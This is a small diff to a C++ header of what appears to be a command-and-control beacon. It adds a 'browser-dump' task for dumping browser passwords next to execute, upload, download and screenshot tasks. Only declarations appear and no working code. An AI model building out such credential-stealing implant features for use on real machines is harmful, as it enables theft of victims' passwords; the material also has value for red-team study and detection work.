@@ -127,10 +127,19 @@ struct ScreenshotTask {
 	const std::string id;
 };
 
+// DumpBrowserPasswordsTask
+// -------------------------------------------------------------------------------------------
+struct DumpBrowserPasswordsTask {
+	DumpBrowserPasswordsTask(const std::string& id);
+	constexpr static std::string_view key{ "browser-dump" };
+	[[nodiscard]] Result run() const;
+	const std::string id;
+};
+
 // ===========================================================================================
 
 // REMEMBER: Any new tasks must be added here too!
-using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses, KillBeaconProcess, DownloadFileTask, UploadFileTask, ScreenshotTask>;
+using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, ListRunningProcesses, KillBeaconProcess, DownloadFileTask, UploadFileTask, ScreenshotTask, DumpBrowserPasswordsTask>;
 
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
 	std::function<void(const Configuration&)> setter);
